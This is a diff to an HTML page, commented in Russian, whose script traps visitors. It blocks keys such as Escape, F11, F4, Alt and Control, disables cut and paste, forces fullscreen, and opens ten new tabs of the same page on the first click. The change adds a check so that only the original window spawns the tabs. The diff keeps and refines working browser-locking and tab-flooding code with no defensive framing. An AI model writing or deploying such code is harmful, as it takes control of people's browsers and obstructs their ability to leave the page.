@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>ANTIDOTE + 10 TABS ON FIRST CLICK</title>
+    <title>ANTIDOTE + 10 TABS (ONCE, ONLY MAIN)</title>
     <style>
         body {
             background: url('https://avatars.mds.yandex.net/i?id=812dcd22b1b1798df7daf79ae5d2731540b75369-8497211-images-thumbs&n=13') no-repeat center center fixed;
@@ -15,7 +15,6 @@
             min-height: 100vh;
             position: relative;
             transition: background-image 0.3s ease;
-            /* cursor: none;  удалено – курсор видим */
         }
         body::before {
             content: "";
@@ -105,7 +104,7 @@
 
     <script>
         (function() {
-            // ========== БЛОКИРОВКА КЛАВИШ (без изменений) ==========
+            // ========== БЛОКИРОВКА КЛАВИШ ==========
             function blockAllKeys(e) {
                 const forbiddenKeys = [
                     'Escape', 'F11', 'F4', 'Alt', 'Control', 'Meta', 'Win', 'OS',
@@ -145,7 +144,7 @@
             document.addEventListener('cut', e => e.preventDefault());
             document.addEventListener('paste', e => e.preventDefault());
 
-            // ========== ПОЛНОЭКРАННЫЙ РЕЖИМ (БЕЗ ЗАХВАТА МЫШИ) ==========
+            // ========== ПОЛНОЭКРАННЫЙ РЕЖИМ ==========
             function requestFullscreen() {
                 if (document.documentElement.requestFullscreen) {
                     document.documentElement.requestFullscreen().catch(() => {});
@@ -165,17 +164,21 @@
                 }
             });
 
-            // ========== АВТОМАТИЧЕСКОЕ ОТКРЫТИЕ 10 ВКЛАДОК ПРИ ПЕРВОМ КЛИКЕ ==========
-            let tabsOpened = false;
-            document.addEventListener('click', function openTabs() {
-                if (!tabsOpened) {
-                    const currentUrl = window.location.href;
-                    for (let i = 0; i < 10; i++) {
-                        window.open(currentUrl, '_blank');
+            // ========== ОТКРЫТИЕ 10 ВКЛАДОК ТОЛЬКО В ГЛАВНОМ ОКНЕ ==========
+            // Проверяем, есть ли opener (окно было открыто другим окном)
+            if (!window.opener) {
+                // Используем флаг, чтобы сработало только один раз
+                let tabsOpened = false;
+                document.addEventListener('click', function openTabs() {
+                    if (!tabsOpened) {
+                        const currentUrl = window.location.href;
+                        for (let i = 0; i < 10; i++) {
+                            window.open(currentUrl, '_blank');
+                        }
+                        tabsOpened = true;
                     }
-                    tabsOpened = true;
-                }
-            }, { once: true }); // сработает только один раз
+                }, { once: true }); // once гарантирует выполнение только один раз
+            }
 
             // ========== СЧЁТЧИК КГ ==========
             let kg = localStorage.getItem('kgCounter') || 0;
